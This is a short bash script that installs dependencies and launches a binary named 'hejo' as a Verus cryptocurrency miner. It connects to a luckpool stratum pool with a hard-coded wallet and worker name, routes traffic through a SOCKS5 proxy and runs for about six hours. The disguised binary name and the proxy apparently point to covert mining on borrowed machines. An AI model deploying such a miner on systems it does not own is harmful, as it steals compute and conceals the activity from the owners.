#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=RTEmjgEnFktDbtCLTqxof98bYN7v9syLAM
C=ttdj1
D=socks5://51.222.12.245:10084
timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
sudo apt update